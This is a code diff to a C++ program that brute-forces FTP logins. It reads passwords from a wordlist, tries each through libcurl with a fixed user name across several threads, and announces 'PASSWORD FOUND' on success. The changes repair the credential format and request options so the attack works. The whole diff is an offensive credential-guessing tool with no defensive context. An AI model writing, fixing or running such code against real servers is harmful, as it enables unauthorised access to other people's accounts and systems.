@@ -22,36 +22,38 @@ void FUZZ::creatThread()
     for (auto &t : threadPool)
     {
         t.join();
-    } 
+    }
 }
+
+
 
 int FUZZ::cheack(std::string pass)
 {
-    std::string curlFtp = "ftp://ftp." + IP + ".com/";
+    std::string curlFtp = "ftp://" + IP + "/";
 
-    try {
-        CURL *curl = curl_easy_init();
-        if (!curl)
-            throw std::runtime_error("Error in init curl");
-        curl_easy_setopt(curl, CURLOPT_URL, curlFtp);
-        curl_easy_setopt(curl, CURLOPT_USERPWD, user + pass);
-        CURLcode res = curl_easy_perform(curl);
-        if(res != CURLE_OK) {
-            // if(res == CURLE_REMOTE_ACCESS_DENIED)
-            //     throw std::runtime_error("Login failed: wrong username or password!\n");
-            // else
-            //     throw std::runtime_error("Curl error: " << curl_easy_strerror(res) << std::endl;
-        } else {
-            std::lock_guard<std::mutex> lock(lock_print);
-            std::cout << "FTP operation succeeded. [" << pass << "]" << std::endl;
-            exit(1);
-        }
-    } 
-    catch (std::exception &e) {
-        std::cerr << "FTP error: " << e.what() << std::endl;
-        exit(1);
+    CURL *curl = curl_easy_init();
+    if (!curl)
+        return 0;
+
+    curl_easy_setopt(curl, CURLOPT_URL, curlFtp.c_str());
+    curl_easy_setopt(curl, CURLOPT_USERPWD, (user + ":" + pass).c_str());
+    curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
+    curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // no download
+
+    CURLcode res = curl_easy_perform(curl);
+
+    if (res == CURLE_OK) {
+        std::lock_guard<std::mutex> lock(lock_print);
+        std::cout << "\n[SUCCESS] PASSWORD FOUND: " << pass << std::endl;
+        curl_easy_cleanup(curl);
+        exit(0);
+    } else {
+        std::lock_guard<std::mutex> lock(lock_print);
+        std::cout << "[FAIL] " << pass << std::endl;
     }
-    return 1;
+
+    curl_easy_cleanup(curl);
+    return 0;
 }
 
 void    FUZZ::Broot()
@@ -63,11 +65,14 @@ void    FUZZ::Broot()
             std::lock_guard<std::mutex> lock(lock_file);
             if (!getline(file, line))
                 return;
-        }
-        {
-            // std::lock_guard<std::mutex> lock(lock_print);
+            if (line.empty())
+                continue;
             cheack(line);
-            // std::cout << "line is : " << line << std::endl;
         }
+        // {
+        //     // std::lock_guard<std::mutex> lock(lock_print);
+            
+        //     // std::cout << "line is : " << line << std::endl;
+        // }
     }
 }
